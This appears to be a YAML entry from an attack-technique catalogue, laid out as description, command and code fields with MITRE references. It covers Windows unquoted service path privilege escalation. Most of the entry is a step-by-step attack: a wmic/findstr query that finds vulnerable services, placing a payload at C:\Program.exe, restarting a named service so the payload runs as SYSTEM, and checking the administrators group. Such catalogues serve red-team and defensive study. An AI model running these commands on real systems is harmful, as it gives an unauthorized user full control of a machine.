---
description: |
  This attack exploits an unquoted service path in a Windows service to achieve local privilege escalation.
  By placing a malicious executable in a higher‐level directory of the service’s unquoted ImagePath,
  Windows will execute it with the service’s SYSTEM privileges.

  Command Reference:
    wmic, sc qc, copy, sc stop, sc start, net localgroup
      Target: Any Windows service whose ImagePath contains spaces and is not enclosed in quotes

command: |
  # Enumerate auto-start services with unquoted paths
  wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v "\""

code: |
  # 1. Find services with unquoted paths
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v "\""

  # 2. Query service configuration
  sc qc SystemExplorerHelpService  # PathName: C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

  # 3. Place malicious EXE at C:\Program.exe
  copy /Y C:\Temp\payload.exe C:\Program.exe  # writable by standard user

  # 4. Stop and start service to load C:\Program.exe
  sc stop SystemExplorerHelpService
  sc start SystemExplorerHelpService

  # 5. Confirm SYSTEM execution by checking impact
  net localgroup administrators

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
  - Privilege Escalation
references:
  - https://attack.mitre.org/techniques/T1574/009
  - https://blackpointcyber.com/blog/unlocking-the-mystery-of-unquoted-service-paths-another-opportunity-for-privilege-escalation/
---
